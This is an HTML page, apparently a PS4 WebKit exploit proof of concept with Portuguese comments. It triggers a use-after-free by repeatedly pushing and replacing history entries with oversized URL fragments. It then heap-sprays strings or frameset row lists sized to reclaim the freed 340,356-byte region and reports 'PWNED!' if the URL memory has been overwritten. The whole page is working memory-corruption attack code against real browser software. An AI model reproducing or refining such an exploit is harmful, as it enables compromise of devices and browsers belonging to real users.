<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Manual Geometry Fix</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 15px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 14px; cursor: pointer; 
        border: 2px solid #0f0; background: #222; color: #fff;
    }
    button:hover { background: #0f0; color: #000; }
    #log { border-top: 1px solid #555; margin-top: 20px; padding-top: 10px; white-space: pre-wrap; }
    .h1 { color: #fff; border-bottom: 1px solid #555; padding-bottom: 5px; }
</style>
</head>
<body>
<h2 class="h1">PS4 Manual Fix: Target 340KB</h2>
<div id="status">Selecione o método:</div>

<button onclick="runMethod('STRING')">MÉTODO 1: STRING UTF-16 (~170k chars)</button>
<button onclick="runMethod('FRAMESET')">MÉTODO 2: FRAMESET (~42.5k commas)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m) { logEl.innerHTML += m + "<br>"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runMethod(method) {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Rodando " + method + "...";

    // 1. TRIGGER UAF (O código padrão que cria o buraco)
    log("1. Disparando UAF (Criando buraco de 340.356 bytes)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        size += STEP;
        await sleep(5);
    }
    
    await sleep(50); // Pausa para o free() ocorrer

    // 2. RECLAMAÇÃO DE MEMÓRIA (Cálculo Fixo)
    const HOLE_SIZE = 340356;
    
    if(method === 'STRING') {
        // CORREÇÃO 1: Buraco / 2
        let targetChars = Math.floor(HOLE_SIZE / 2);
        log(`[STRING] Alvo: ${HOLE_SIZE} bytes`);
        log(`[STRING] Enviando: ${targetChars} caracteres (x2 bytes = ${targetChars*2})`);
        
        // Variação de -100 a +100 chars para alinhar header
        for(let delta = -100; delta <= 100; delta += 4) {
            let len = targetChars + delta;
            // Prefixo curto para garantir alocação única
            let payload = "W".repeat(len);
            keepAlive.push(payload);
        }

    } else if(method === 'FRAMESET') {
        // CORREÇÃO 2: Buraco / 8
        let targetCommas = Math.floor(HOLE_SIZE / 8);
        log(`[FRAMESET] Alvo: ${HOLE_SIZE} bytes`);
        log(`[FRAMESET] Enviando: ${targetCommas} vírgulas (x8 bytes = ${targetCommas*8})`);
        
        // Variação maior pois framesets são sensíveis
        for(let delta = -200; delta <= 200; delta += 2) {
            let count = targetCommas + delta;
            try {
                let f = document.createElement("frameset");
                f.rows = ",".repeat(count);
                keepAlive.push(f);
            } catch(e) {}
        }
    }

    log("Spray concluído. Aguardando...");
    await sleep(200);

    // 3. VERIFICAÇÃO
    let url = document.URL;
    let success = false;
    
    // Procura por evidências de sucesso
    // Se for string, procura 'W'. Se for frameset, procura dados binários (não-V)
    if(method === 'STRING') {
        let wCount = 0;
        for(let i=0; i<2000; i++) if(url[i] === 'W') wCount++;
        if(wCount > 50) success = true;
    } else {
        // Para frameset, qualquer coisa que não seja V, h, t, p, :, / é sinal de sucesso
        for(let i=1000; i<2000; i++) {
            if(url[i] !== 'V') {
                success = true; 
                break;
            }
        }
    }

    if(success) {
        log("!!! SUCESSO !!! Memória Reclamada.");
        statusEl.innerText = "PWNED!";
        statusEl.style.color = "#0ff";
    } else {
        log("Falha: Ainda vendo 'V'. O alinhamento ainda pode estar off por poucos bytes.");
    }
}
</script>
</body>
</html>
